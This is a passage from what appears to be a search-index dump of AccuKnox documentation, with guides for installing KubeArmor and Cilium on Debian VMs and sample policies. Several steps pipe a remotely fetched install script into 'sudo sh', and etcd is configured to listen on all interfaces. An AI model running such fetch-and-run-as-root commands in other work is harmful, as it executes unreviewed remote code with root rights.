-l \"app=wordpress\" -f yaml <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\nname: autopol-system-3960684242\nnamespace: wordpress-mysql\nspec:\naction: Allow\nfile:\nmatchPaths:\n- fromSource:\n- path: /usr/sbin/apache2\npath: /dev/urandom\n- fromSource:\n- path: /usr/local/bin/php\npath: /etc/hosts\nnetwork:\nmatchProtocols:\n- fromSource:\n- path: /usr/local/bin/php\nprotocol: tcp\n- fromSource:\n- path: /usr/local/bin/php\nprotocol: udp\nprocess:\nmatchPaths:\n- path: /usr/sbin/apache2\n- path: /usr/local/bin/php\nselector:\nmatchLabels:\napp: wordpress\nseverity: 1\n</code></pre>"},{"location":"open-source/quick_start_guide/#6-uninstall","title":"6. Uninstall","text":"<pre><code>karmor uninstall\n\n# If there is no other workloads deployed in accuknox-agents namesapce apart from DE, this can be removed\nkubectl delete ns accuknox-agents\n</code></pre>"},{"location":"open-source/quick_start_guide/#references","title":"References","text":"<ol> <li>AccuKnox Splunk App for Compliance and K8s Events</li> <li>KubeArmor support matrix</li> <li>Integrating Kubearmor with Prometheus and Grafana</li> </ol>"},{"location":"open-source/what-is-cilium/","title":"What is Cilium?","text":""},{"location":"open-source/what-is-cilium/#cilium-ebpf-based-networking-observability-and-security","title":"Cilium | eBPF-based Networking, Observability, and Security","text":"<p>Cilium is an open source project to provide eBPF-based networking, security, and observability for cloud native environments such as Kubernetes clusters and other container orchestration platforms.</p>"},{"location":"open-source/what-is-cilium/#the-cilium-in-use-by-accuknox-contains-several-upgrades-including","title":"The Cilium in use by Accuknox contains several upgrades including","text":"<p>Accuknox has been contributing  to Cilium and maintains a fork of the same (which is being upstreamed back to the primary distribution) with improvements in the following areas  - Extensible Identity solution based on SPIFFE standards  - Improving policy audit handling  - Improving policy telemetry and statistics collection to fit realistic scenarios  - Policy discovery tools.</p>"},{"location":"open-source/what-is-cilium/#where-can-i-get-the-upgrades-to-cilium","title":"Where can I get the upgrades to Cilium","text":"<p>Find upgrades to our Cilium policies by visiting our open source github repos at https://github.com/kubearmor/cilium</p>"},{"location":"open-source/what-is-cilium/#do-we-intend-to-maintain-a-separate-version-of-cilium","title":"Do we intend to maintain a separate version of Cilium?","text":"<p>No. A fork exists to allow our community of users to directly access the feature upgrades that Accuknox is building. However all changes are being upstreamed to the community hosted at https://github.com/cilium</p>"},{"location":"open-source/what-is-kubearmor/","title":"What is KubeArmor?","text":""},{"location":"open-source/what-is-kubearmor/#kubearmor-cloud-native-runtime-security-enforcement-system","title":"KubeArmor | Cloud Native Runtime Security Enforcement System","text":"<p>KubeArmor is a cloud-native runtime security enforcement system that restricts the behavior (such as process execution, file access, and networking operation) of containers and nodes at the system level.</p> <p>KubeArmor operates with Linux security modules LSMs, meaning that it can work on top of any Linux platforms (such as Alpine, Ubuntu, and Container-optimized OS from Google) if Linux security modules (e.g., AppArmor, SELinux, or BPF-LSM) are enabled in the Linux Kernel. KubeArmor will use the appropriate LSMs to enforce the required policies.</p> <p>KubeArmor allows operators to define security policies and apply them to Kubernetes. Then, KubeArmor will automatically detect the changes in security policies from Kubernetes and enforce them to the corresponding containers and nodes.</p> <p>If there are any violations against security policies, KubeArmor immediately generates alerts with container identities. If operators have any logging systems, it automatically sends the alerts to their systems as well.</p> <p></p>"},{"location":"open-source/what-is-kubearmor/#functionality-overview","title":"Functionality Overview","text":"<ul> <li>Restrict the behavior of containers and nodes at the system level</li> </ul> <p>Traditional container security solutions (e.g., Cilium) protect containers by determining their inter-container relations (i.e., service flows) at the network level. In contrast, KubeArmor prevents malicious or unknown behaviors in containers by specifying their desired actions (e.g., a specific process should only be allowed to access a sensitive file). KubeArmor also allows operators to restrict the behaviors of nodes based on node identities.</p> <ul> <li>Enforce security policies to containers in runtime</li> </ul> <p>In general, security policies (e.g., Seccomp and AppArmor profiles) are statically defined within pod definitions for Kubernetes, and they are applied to containers at creation time. Then, the security policies are not allowed to be updated in runtime.</p> <p>To avoid this problem, KubeArmor maintains security policies separately, which means that security policies are no longer tightly coupled with containers. Then, KubeArmor directly applies the security policies into Linux security modules LSMs for each container according to the labels of given containers and security policies.</p> <ul> <li>Produce container-aware alerts and system logs</li> </ul> <p>LSMs do not have any container-related information; thus, they generate alerts and system logs only based on system metadata (e.g., User ID, Group ID, and process ID). Therefore, it is hard to figure out what containers cause policy violations.</p> <p>To address this problem, KubeArmor uses an eBPF-based system monitor, which keeps track of process life cycles in containers, and converts system metadata to container identities when LSMs generate alerts and system logs for any policy violations from containers.</p> <ul> <li>Provide easy-to-use semantics for policy definitions</li> </ul> <p>KubeArmor provides the ability to monitor the life cycles of containers' processes and take policy decisions based on them. In general, it is much easier to deny a specific action but it is more difficult to allow only specific actions while denying all. KubeArmor manages internal complexities associated with handling such policy decisions and provides easy semantics towards policy language.</p> <ul> <li>Support network security enforcement among containers</li> </ul> <p>KubeArmor aims to protect containers themselves rather than interactions among containers. However, using KubeArmor a user can add policies that could apply policy settings at the level of network system calls (e.g., bind(), listen(), accept(), and connect()), thus somewhat controlling interactions among containers.</p>"},{"location":"open-source/bullseye/bullseye/","title":"Bullseye","text":""},{"location":"open-source/bullseye/bullseye/#overview","title":"Overview","text":"<p>This user journey guides you to install and verify the compatibility of Kuberarmor and Cilium on Debian 11 (Bullseye) with 5.10 Kernel Version by applying policies on kubernetes workloads.</p>"},{"location":"open-source/bullseye/bullseye/#step-1-install-etcd-in-control-plane-vm","title":"Step 1: Install etcd in control plane VM","text":"<pre><code>sudo apt-get install etcd\n</code></pre> <p>Once etcd installed, configure the following values in /etc/default/etcd as shown below.</p> <pre><code>ETCD_LISTEN_CLIENT_URLS=http://0.0.0.0:2379\nETCD_ADVERTISE_CLIENT_URLS=http://0.0.0.0:2379\n</code></pre> <p>Restart and Check the status of etcd: </p> <pre><code>sudo service etcd restart\n</code></pre> <pre><code>sudo service etcd enable\n</code></pre> <pre><code>sudo service etcd status\n</code></pre> <p></p>"},{"location":"open-source/bullseye/bullseye/#step-2-install-kvm-service-in-control-plane","title":"Step 2: Install KVM-Service in control plane","text":"<p>Download the Latest RPM Package</p> <pre><code>wget https://github.com/kubearmor/kvm-service/releases/download/0.1/kvmservice_0.1_linux-amd64.deb\n</code></pre> <p></p> <pre><code>dpkg -i kvmservice_0.1_linux-amd64.deb </code></pre> <p></p> <pre><code>systemctl status kvmservice\n</code></pre> <p></p>"},{"location":"open-source/bullseye/bullseye/#step-3-install-karmor-in-control-plane","title":"Step 3: Install Karmor in control plane","text":"<pre><code>curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin\n</code></pre>"},{"location":"open-source/bullseye/bullseye/#step-4-onboard-vms-using-karmor","title":"Step 4: Onboard VMs using Karmor","text":"<pre><code>cat kvmpolicy1.yaml\n</code></pre> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorVirtualMachine\nmetadata:\nname: testvm1\nlabels:\nname: vm1\nvm: true\n</code></pre> <p>Run this command to Add the VMs:</p> <pre><code>karmor vm add kvmpolicy1.yaml </code></pre> <p></p> <p>To see the onboarded VM\u2019s</p> <pre><code>karmor vm list\n</code></pre> <p></p>"},{"location":"open-source/bullseye/bullseye/#step-5-generate-installation-scripts-for-configured-worker-vms","title":"Step 5: Generate Installation scripts for configured worker VMs","text":"<p>Generate VM Installation scripts for the configured VM by running the following command:</p> <pre><code>karmor vm --kvms getscript -v testvm1\n</code></pre> <p></p>"},{"location":"open-source/bullseye/bullseye/#step-6-execute-the-installation-script-in-vms","title":"Step 6: Execute the Installation script in VMs","text":"<p>Note: Docker needs to install before running the script.</p> <p>Install pre-requisites:</p> <pre><code>sudo apt install bpfcc-tools linux-headers-$(uname -r)\n</code></pre> <pre><code>vi testvm1.sh\n</code></pre> <p>Comment the following line on the script and save it:</p> <pre><code>#sudo docker run --name kubearmor $DOCKER_OPTS $KUBEARMOR_IMAGE $KUBEARMOR_OPTS\n</code></pre> <p></p> <p>Execute the Installation script:</p> <p>Copy the generated installation scripts to appropriate VMs using scp or rsync method and execute the scripts to run Cilium.</p> <p>The script downloads Cilium Docker images and run them as containers in each VM. Cilium running in each VM connects to the KVM-Service control plane to register themselves and receive information about other VMs in the cluster, labels, IPs and configured security policies.</p> <p>Execute the script on worker VM by running the following command:</p> <pre><code>./testvm1.sh\n</code></pre> <p></p> <p>Note: Make sure the KVM-Service is running on control plane VM &amp; To onboard more worker VM repeat Step 4, Step 5 &amp; Step 6.</p> <p>You can Verify by running following command:</p> <pre><code>sudo docker ps\n</code></pre> <p></p>"},{"location":"open-source/bullseye/bullseye/#step-7-install-kubearmor-on-worker-vms","title":"Step 7: Install Kubearmor on worker VMs","text":"<p>Download the Latest release of KubeArmor</p> <pre><code>wget https://github.com/kubearmor/KubeArmor/releases/download/v0.3.1/kubearmor_0.3.1_linux-amd64.deb\n</code></pre> <p></p> <pre><code>dpkg -i kubearmor_0.3.1_linux-amd64.deb </code></pre> <p>Note: While Installing if you get the following error,</p> <p></p> <p>Run the following command.</p> <pre><code>$apt --fix-broken install    to fix the error &amp; \nreinstall $dpkg -i kubearmor_0.3.1_linux-amd64.deb </code></pre> <p></p> <p>Start and Check the status of Kubearmor:</p> <pre><code>sudo systemctl start kubearmor\n</code></pre> <pre><code>sudo systemctl enable kubearmor\n</code></pre> <pre><code>sudo systemctl status kubearmor\n</code></pre> <p></p>"},{"location":"open-source/bullseye/bullseye/#step-8-apply-and-verify-kubearmor-system-policy","title":"Step 8: Apply and Verify Kubearmor system policy","text":"<pre><code>cat khp-example-vmname.yaml\n</code></pre> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorHostPolicy\nmetadata:\nname: khp-02\nspec:\nseverity: 5\nfile:\nmatchPaths:\n- path: /proc/cpuinfo\naction:\nBlock\n</code></pre> <p>Run this command to apply the policy:</p> <pre><code>karmor vm --kvms policy add khp-example-vmname.yaml\n</code></pre>"},{"location":"open-source/bullseye/bullseye/#step-9-policy-violation","title":"Step 9: Policy Violation","text":"<p>With the above mentioned policy enforced in the VM, if a user tries to access /proc/cpuinfo file, user will see permission denied error and karmor log will show the alert log for blocking the file access as shown below.</p> <pre><code>cat /proc/cpuinfo\n</code></pre> <p></p> <p>Verifying policy Violation logs:</p> <pre><code>karmor log\n</code></pre> <p></p>"},{"location":"open-source/bullseye/bullseye/#step-10-apply-and-verify-cilium-network-policy","title":"Step 10: Apply and Verify Cilium network policy","text":"<p>1. Allow connectivity with the control plane ( and port 2379) <pre><code>cat vm-allow-control-plane.yaml\n</code></pre> <pre><code>kind: CiliumNetworkPolicy\nmetadata:\nname: \"vm-allow-control-plane\"\nspec:\ndescription: \"Policy to allow traffic to kv-store\"\nnodeSelector:\nmatchLabels:\nname: vm1\negress:\n- toCIDR:\n- 10.138.0.5/32\ntoPorts:\n- ports:\n- port: \"2379\"\nprotocol: TCP\n</code></pre> <p>2. For SSH connectivity allow port 22 and 169.254.169.254 port 80</p> <pre><code>cat vm-allow-ssh.yaml\n</code></pre> <pre><code>kind: CiliumNetworkPolicy\nmetadata:\nname: \"vm-allow-ssh\"\nspec:\ndescription: \"Policy to allow SSH\"\nnodeSelector:\nmatchLabels:\nname: vm1\negress:\n- toPorts:\n- ports:\n- port: \"22\"\nprotocol: TCP\n- toCIDR:\n- 169.254.169.254/32\ntoPorts:\n- ports:\n- port: \"80\"\nprotocol: TCP\n</code></pre> <p>3. This policy block the DNS access in VM</p> <pre><code>cat vm-dns-visibility.yaml\n</code></pre> <pre><code>kind: CiliumNetworkPolicy\nmetadata:\nname: \"vm-dns-visibility\"\nspec:\ndescription: \"Policy to enable DNS visibility\"\nnodeSelector:\nmatchLabels:\nname: vm1\negress:\n- toPorts:\n- ports:\n- port: \"53\"\nprotocol: ANY\nrules:\ndns:\n- matchPattern: \"*\"\n</code></pre> <p>4. This policy allow access of \u201cwww.google.co.in\u201d alone in VM</p> <pre><code>cat vm-allow-www.google.co.in.yaml\n</code></pre> <pre><code>kind: CiliumNetworkPolicy\nmetadata:\nname: \"vm-allow-www.google.co.in\"\nspec:\ndescription: \"Policy to allow traffic to www.google.co.in\"\nnodeSelector:\nmatchLabels:\nname: vm1\negress:\n- toFQDNs:\n- matchName: www.google.co.in\ntoPorts:\n- ports:\n- port: \"80\"\nprotocol: TCP\n- port: \"443\"\nprotocol: TCP\n</code></pre> <p>Run this command to apply the policy:</p> <pre><code>karmor vm --kvms policy add vm-allow-control-plane.yaml\n</code></pre> <pre><code>karmor vm --kvms policy add vm-allow-ssh.yaml </code></pre> <pre><code>karmor vm --kvms policy add vm-dns-visibility.yaml </code></pre> <pre><code>karmor vm --kvms policy add vm-allow-www-google-co-in.yaml </code></pre> <p></p>"},{"location":"open-source/bullseye/bullseye/#step-11-policy-violation","title":"Step 11: Policy Violation","text":"<pre><code>curl http://www.google.co.in/\n</code></pre> <pre><code>curl https://go.dev/\n</code></pre> <p>Verifying policy Violation logs:</p> <pre><code>docker exec -it cilium hubble observe -f -t policy-verdict\n</code></pre> <p></p>"},{"location":"open-source/buster/buster/","title":"Buster","text":""},{"location":"open-source/buster/buster/#overview","title":"Overview","text":"<p>This user journey guides you to install and verify the compatibility of Kuberarmor and Cilium on Debian 10 (Buster) with 4.19 Kernel Version by applying policies on kubernetes workloads.</p>"},{"location":"open-source/buster/buster/#step-1-install-etcd-in-control-plane-vm","title":"Step 1: Install etcd in control plane VM","text":"<pre><code>sudo apt-get install etcd\n</code></pre> <p>Once etcd installed, configure the following values in /etc/default/etcd as shown below.</p> <pre><code>ETCD_LISTEN_CLIENT_URLS=http://0.0.0.0:2379\nETCD_ADVERTISE_CLIENT_URLS=http://0.0.0.0:2379\n</code></pre> <p>Restart and Check the status of etcd:</p> <pre><code>sudo service etcd restart\n</code></pre> <pre><code>sudo service etcd status\n</code></pre> <p></p>"},{"location":"open-source/buster/buster/#step-2-install-kvm-service-in-control-plane","title":"Step 2: Install KVM-Service in control plane","text":"<p>Download the Latest deb Package</p> <pre><code>wget https://github.com/kubearmor/kvm-service/releases/download/0.1/kvmservice_0.1_linux-amd64.deb\n</code></pre> <p></p> <pre><code>dpkg -i kvmservice_0.1_linux-amd64.deb </code></pre> <p></p> <pre><code>systemctl status kvmservice </code></pre> <p></p>"},{"location":"open-source/buster/buster/#step-3-install-karmor-in-control-plane","title":"Step 3: Install Karmor in control plane","text":"<pre><code>curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin\n</code></pre>"},{"location":"open-source/buster/buster/#step-4-onboard-vms-using-karmor","title":"Step 4: Onboard VMs using Karmor","text":"<pre><code>cat kvmpolicy1.yaml\n</code></pre> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorVirtualMachine\nmetadata:\nname: testvm1\nlabels:\nname: vm1\nvm: true\n</code></pre> <p>Run this command to Add the VM:</p> <pre><code>karmor vm add kvmpolicy1.yaml\n</code></pre> <p></p> <p>To see the onboarded VM\u2019s</p> <pre><code>karmor vm list\n</code></pre> <p></p>"},{"location":"open-source/buster/buster/#step-5-generate-installation-scripts-for-configured-worker-vms","title":"Step 5: Generate Installation scripts for configured worker VMs","text":"<p>Generate VM Installation scripts for the configured VM by running the following command:</p> <pre><code>karmor vm --kvms getscript -v testvm1\n</code></pre> <p></p>"},{"location":"open-source/buster/buster/#step-6-execute-the-installation-script-in-vms","title":"Step 6: Execute the Installation script in VMs","text":"<p>Install pre-requisites:</p> <ul> <li> <p>Docker needs to install before running the script.</p> </li> <li> <p>Repositories: /etc/apt/sources.list should include the non-free repository and look something like this:</p> </li> </ul> <pre><code>vi /etc/apt/sources.list\n</code></pre> <p>Add the following:</p> <pre><code>deb http://deb.debian.org/debian sid main contrib non-free\n</code></pre> <pre><code>deb-src http://deb.debian.org/debian sid main contrib non-free\n</code></pre> <p></p> <p>Install Build dependencies:</p> <pre><code>apt-get update\n</code></pre> <p>According to debian.org</p> <pre><code>sudo apt-get install arping bison clang-format cmake dh-python \\\ndpkg-dev pkg-kde-tools ethtool flex inetutils-ping iperf \\\nlibbpf-dev libclang-dev libclang-cpp-dev libedit-dev libelf-dev \\\nlibfl-dev libzip-dev linux-libc-dev llvm-dev libluajit-5.1-dev \\\nluajit python3-netaddr python3-pyroute2 python3-distutils python3\n</code></pre> <p>Install and Compile BCC:</p> <pre><code>git clone https://github.com/iovisor/bcc.git\n</code></pre> <pre><code>mkdir bcc/build; cd bcc/build\n</code></pre> <pre><code>sudo make install\n</code></pre> <pre><code>cmake ..\n</code></pre> <pre><code>make\n</code></pre> <p>Install linux-headers:</p> <pre><code>sudo apt install linux-headers-$(uname -r)\n</code></pre> <p>Note: If youre getting this following error,</p> <p></p> <p>Follow this steps to slove the error.</p> <pre><code>sudo make install\n</code></pre> <pre><code>apt install gcc-8\n</code></pre> <p></p> <pre><code>sudo apt install linux-headers-$(uname -r)\n</code></pre> <p></p> <p>Comment the following line on the script and save it:</p> <pre><code>vi testvm1.sh\n</code></pre> <pre><code>#sudo docker run --name kubearmor $DOCKER_OPTS $KUBEARMOR_IMAGE $KUBEARMOR_OPTS\n</code></pre> <p></p> <p>Execute the Installation script:</p> <p>Copy the generated installation scripts to appropriate VMs using scp or rsync method and execute the scripts to run Cilium.</p> <p>The script downloads Cilium Docker images and run them as containers in each VM. Cilium running in each VM connects to the KVM-Service control plane to register themselves and receive information about other VMs in the cluster, labels, IPs and configured security policies.</p> <p>Execute the script on worker VM by running the following command:</p> <pre><code>./testvm1.sh\n</code></pre> <p></p> <p>Note: Make sure the KVM-Service is running on control plane VM &amp; To Onboard more worker VM repeat Step 4, Step 5 &amp; Step 6.</p> <p>You can Verify by running following command:</p> <pre><code>sudo docker ps\n</code></pre> <p></p>"},{"location":"open-source/buster/buster/#step-7-install-kubearmor-on-worker-vms","title":"Step 7: Install Kubearmor on worker VMs","text":"<p>Download the Latest release of KubeArmor</p> <pre><code>wget https://github.com/kubearmor/KubeArmor/releases/download/v0.3.1/kubearmor_0.3.1_linux-amd64.deb\n</code></pre> <p></p> <pre><code>dpkg -i kubearmor_0.3.1_linux-amd64.deb </code></pre> <p>Note: While Installing if you get the following error,</p> <p></p> <p>Run the following command to fix the error.</p> <pre><code>apt --fix-broken install   </code></pre> <pre><code>dpkg -i kubearmor_0.3.1_linux-amd64.deb </code></pre> <p></p> <p>Start and Check the status of Kubearmor:</p> <pre><code>sudo systemctl start kubearmor\n</code></pre> <pre><code>sudo systemctl enable kubearmor\n</code></pre> <pre><code>sudo systemctl status kubearmor\n</code></pre> <p></p>"},{"location":"open-source/buster/buster/#step-8-apply-and-verify-kubearmor-system-policy","title":"Step 8: Apply and Verify Kubearmor system policy","text":"<pre><code>cat khp-example-vmname.yaml\n</code></pre> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorHostPolicy\nmetadata:\nname: hsp-kubearmor-dev-proc-path-block\nspec:\nprocess:\nmatchPaths:\n- path: /usr/bin/sleep # try sleep 1\naction:\nBlock\n</code></pre> <p>Run this command to apply the policy:</p> <pre><code>karmor vm policy add khp-example-vmname.yaml\n</code></pre> <p></p>"},{"location":"open-source/buster/buster/#step-9-policy-violation","title":"Step 9: Policy Violation","text":"<pre><code>sleep 10\n</code></pre> <p>Verifying policy Violation logs:</p> <pre><code>karmor log\n</code></pre> <p></p>"},{"location":"open-source/buster/buster/#step-10-apply-and-verify-cilium-network-policy","title":"Step 10: Apply and Verify Cilium network policy","text":"<p>1. Allow connectivity with the control plane ( and port 2379) <pre><code>cat vm-allow-control-plane.yaml\n</code></pre> <pre><code>kind: CiliumNetworkPolicy\nmetadata:\nname: \"vm-allow-control-plane\"\nspec:\ndescription: \"Policy to allow traffic to kv-store\"\nnodeSelector:\nmatchLabels:\nname: vm1\negress:\n- toCIDR:\n- 10.138.0.5/32\ntoPorts:\n- ports:\n- port: \"2379\"\nprotocol: TCP\n</code></pre> <p>2. For SSH connectivity allow port 22 and 169.254.169.254 port 80</p> <pre><code>cat vm-allow-ssh.yaml\n</code></pre> <pre><code>kind: CiliumNetworkPolicy\nmetadata:\nname: \"vm-allow-ssh\"\nspec:\ndescription: \"Policy to allow SSH\"\nnodeSelector:\nmatchLabels:\nname: vm1\negress:\n- toPorts:\n- ports:\n- port: \"22\"\nprotocol: TCP\n- toCIDR:\n- 169.254.169.254/32\ntoPorts:\n- ports:\n- port: \"80\"\nprotocol: TCP\n</code></pre> <p>3. This policy block the DNS access in VM</p> <pre><code>cat vm-dns-visibility.yaml\n</code></pre> <pre><code>kind: CiliumNetworkPolicy\nmetadata:\nname: \"vm-dns-visibility\"\nspec:\ndescription: \"Policy to enable DNS visibility\"\nnodeSelector:\nmatchLabels:\nname: vm1\negress:\n- toPorts:\n- ports:\n- port: \"53\"\nprotocol: ANY\nrules:\ndns:\n- matchPattern: \"*\"\n</code></pre> <p>4. This policy allow access of \u201cwww.google.co.in\u201d alone in VM</p> <pre><code>cat vm-allow-www-google-co-in.yaml\n</code></pre> <pre><code>kind: CiliumNetworkPolicy\nmetadata:\nname: \"vm-allow-www.google.co.in\"\nspec:\ndescription: \"Policy to allow traffic to www.google.co.in\"\nnodeSelector:\nmatchLabels:\nname: vm1\negress:\n- toFQDNs:\n- matchName: www.google.co.in\ntoPorts:\n- ports:\n- port: \"80\"\nprotocol: TCP\n- port: \"443\"\nprotocol: TCP\n</code></pre> <p>Run this command to apply the policy:</p> <pre><code>karmor vm --kvms policy add vm-allow-control-plane.yaml\n</code></pre> <pre><code>karmor vm --kvms policy add vm-allow-ssh.yaml </code></pre> <pre><code>karmor vm --kvms policy add vm-dns-visibility.yaml </code></pre> <pre><code>karmor vm --kvms policy add vm-allow-www-google-co-in.yaml </code></pre> <p></p>"},{"location":"open-source/buster/buster/#step-11-policy-violation-on-worker-node","title":"Step 11: Policy Violation on worker node","text":"<pre><code>curl http://www.google.co.in/\n</code></pre> <pre><code>curl https://go.dev/\n</code></pre> <p>Verifying policy Violation logs:</p> <pre><code>docker exec -it cilium hubble observe -f -t policy-verdict\n</code></pre> <p></p>"},{"location":"open-source/cilium/bullseye/","title":"Debian 11 (Bullseye)","text":""},{"location":"open-source/cilium/bullseye/#overview","title":"Overview","text":"<p>This user journey guides you to install and verify the compatibility of Cilium on Debian 11 (Bullseye) with 5.10 Kernel Version by applying policies on VM workloads.</p>"},{"location":"open-source/cilium/bullseye/#step-1-install-etcd-in-control-plane-vm","title":"Step 1: Install etcd in control plane VM","text":"<pre><code>sudo apt-get install etcd\n</code></pre> <p>Once etcd installed, configure the following values in /etc/default/etcd as shown below.</p> <pre><code>ETCD_LISTEN_CLIENT_URLS=http://0.0.0.0:2379\nETCD_ADVERTISE_CLIENT_URLS=http://0.0.0.0:2379\n</code></pre> <p>Restart and Check the status of etcd: </p> <pre><code>sudo service etcd restart\n</code></pre> <pre><code>sudo service etcd enable\n</code></pre> <pre><code>sudo service etcd status\n</code></pre> <p></p>"},{"location":"open-source/cilium/bullseye/#step-2-install-kvm-service-in-control-plane","title":"Step 2: Install KVM-Service in control plane","text":"<p>Download the Latest RPM Package</p> <pre><code>wget https://github.com/kubearmor/kvm-service/releases/download/0.1/kvmservice_0.1_linux-amd64.deb\n</code></pre> <p></p> <pre><code>dpkg -i kvmservice_0.1_linux-amd64.deb </code></pre> <p></p> <pre><code>systemctl status kvmservice\n</code></pre> <p></p>"},{"location":"open-source/cilium/bullseye/#step-3-install-karmor-in-control-plane","title":"Step 3: Install Karmor in control plane","text":"<pre><code>curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin\n</code></pre>"},{"location":"open-source/cilium/bullseye/#step-4-onboard-vms-using-karmor","title":"Step 4: Onboard VMs using Karmor","text":"<pre><code>cat kvmpolicy1.yaml\n</code></pre> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorVirtualMachine\nmetadata:\nname: testvm1\nlabels:\nname: vm1\nvm: true\n</code></pre> <p>Run this command to Add the VMs:</p> <pre><code>karmor vm add kvmpolicy1.yaml </code></pre> <p></p> <p>To see the onboarded VM\u2019s</p> <pre><code>karmor vm list\n</code></pre> <p></p>"},{"location":"open-source/cilium/bullseye/#step-5-generate-installation-scripts-for-configured-worker-vms","title":"Step 5: Generate Installation scripts for configured worker VMs","text":"<p>Generate VM Installation scripts for the configured VM by running the following command:</p> <pre><code>karmor vm --kvms getscript -v testvm1\n</code></pre> <p></p>"},{"location":"open-source/cilium/bullseye/#step-6-execute-the-installation-script-in-vms","title":"Step 6: Execute the Installation script in VMs","text":"<p>Note: Docker needs to install before running the script.</p> <pre><code>vi testvm1.sh\n</code></pre> <p>Comment the following line on the script and save it:</p> <pre><code>#sudo docker run --name kubearmor $DOCKER_OPTS $KUBEARMOR_IMAGE $KUBEARMOR_OPTS\n</code></pre> <p></p> <p>Execute the Installation script:</p> <p>Copy the generated installation scripts to appropriate VMs using scp or rsync method and execute the scripts to run Cilium.</p> <p>The script downloads Cilium Docker images and run them as containers in each VM. Cilium running in each VM connects to the KVM-Service control plane to register themselves and receive information about other VMs in the cluster, labels, IPs and configured security policies.</p> <p>Execute the script on worker VM by running the following command:</p> <pre><code>./testvm1.sh\n</code></pre> <p></p> <p>Note: Make sure the KVM-Service is running on control plane VM &amp; To onboard more worker VM repeat Step 4, Step 5 &amp; Step 6.</p> <p>You can Verify by running following command:</p> <pre><code>sudo docker ps\n</code></pre> <p></p>"},{"location":"open-source/cilium/bullseye/#step-7-apply-and-verify-cilium-network-policy","title":"Step 7: Apply and Verify Cilium network policy","text":"<p>1. Allow connectivity with the control plane ( and port 2379) <pre><code>cat vm-allow-control-plane.yaml\n</code></pre> <pre><code>kind: CiliumNetworkPolicy\nmetadata:\nname: \"vm-allow-control-plane\"\nspec:\ndescription: \"Policy to allow traffic to kv-store\"\nnodeSelector:\nmatchLabels:\nname: vm1\negress:\n- toCIDR:\n- 10.138.0.5/32\ntoPorts:\n- ports:\n- port: \"2379\"\nprotocol: TCP\n</code></pre> <p>2. For SSH connectivity allow port 22 and 169.254.169.254 port 80</p> <pre><code>cat vm-allow-ssh.yaml\n</code></pre> <pre><code>kind: CiliumNetworkPolicy\nmetadata:\nname: \"vm-allow-ssh\"\nspec:\ndescription: \"Policy to allow SSH\"\nnodeSelector:\nmatchLabels:\nname: vm1\negress:\n- toPorts:\n- ports:\n- port: \"22\"\nprotocol: TCP\n- toCIDR:\n- 169.254.169.254/32\ntoPorts:\n- ports:\n- port: \"80\"\nprotocol: TCP\n</code></pre> <p>3. This policy block the DNS access in VM</p> <pre><code>cat vm-dns-visibility.yaml\n</code></pre> <pre><code>kind: CiliumNetworkPolicy\nmetadata:\nname: \"vm-dns-visibility\"\nspec:\ndescription: \"Policy to enable DNS visibility\"\nnodeSelector:\nmatchLabels:\nname: vm1\negress:\n- toPorts:\n- ports:\n- port: \"53\"\nprotocol: ANY\nrules:\ndns:\n- matchPattern: \"*\"\n</code></pre> <p>4. This policy allow access of \u201cwww.google.co.in\u201d alone in VM</p> <pre><code>cat vm-allow-www.google.co.in.yaml\n</code></pre> <pre><code>kind: CiliumNetworkPolicy\nmetadata:\nname: \"vm-allow-www.google.co.in\"\nspec:\ndescription: \"Policy to allow traffic to www.google.co.in\"\nnodeSelector:\nmatchLabels:\nname: vm1\negress:\n- toFQDNs:\n- matchName: www.google.co.in\ntoPorts:\n- ports:\n- port: \"80\"\nprotocol: TCP\n- port: \"443\"\nprotocol: TCP\n</code></pre> <p>Run this command to apply the policy:</p> <pre><code>karmor vm --kvms policy add vm-allow-control-plane.yaml\n</code></pre> <pre><code>karmor vm --kvms policy add vm-allow-ssh.yaml </code></pre> <pre><code>karmor vm --kvms policy add vm-dns-visibility.yaml </code></pre> <pre><code>karmor vm --kvms policy add vm-allow-www-google-co-in.yaml </code></pre> <p></p>"},{"location":"open-source/cilium/bullseye/#step-8-policy-violation","title":"Step 8: Policy Violation","text":"<pre><code>curl http://www.google.co.in/\n</code></pre> <pre><code>curl https://go.dev/\n</code></pre> <p>Verifying policy Violation logs:</p> <pre><code>docker exec -it cilium hubble observe -f -t policy-verdict\n</code></pre> <p></p>"},{"location":"open-source/cilium/buster/","title":"Debian 10 (Buster)","text":""},{"location":"open-source/cilium/buster/#overview","title":"Overview","text":"<p>This user journey guides you to install and verify the compatibility of Cilium on Debian 10 (Buster) with 4.19 Kernel Version by applying policies on VM workloads.</p>"},{"location":"open-source/cilium/buster/#step-1-install-etcd-in-control-plane-vm","title":"Step 1: Install etcd in control plane VM","text":"<pre><code>sudo apt-get install etcd\n</code></pre> <p>Once etcd installed, configure the following values in /etc/default/etcd as shown below.</p> <pre><code>ETCD_LISTEN_CLIENT_URLS=http://0.0.0.0:2379\nETCD_ADVERTISE_CLIENT_URLS=http://0.0.0.0:2379\n</code></pre> <p>Restart and Check the status of etcd:</p> <pre><code>sudo service etcd restart\n</code></pre> <pre><code>sudo service etcd status\n</code></pre> <p></p>"},{"location":"open-source/cilium/buster/#step-2-install-kvm-service-in-control-plane","title":"Step 2: Install KVM-Service in control plane","text":"<p>Download the Latest deb Package</p> <pre><code>wget https://github.com/kubearmor/kvm-service/releases/download/0.1/kvmservice_0.1_linux-amd64.deb\n</code></pre> <p></p> <pre><code>dpkg -i kvmservice_0.1_linux-amd64.deb </code></pre> <p></p> <pre><code>systemctl status kvmservice </code></pre> <p></p>"},{"location":"open-source/cilium/buster/#step-3-install-karmor-in-control-plane","title":"Step 3: Install Karmor in control plane","text":"<pre><code>curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b 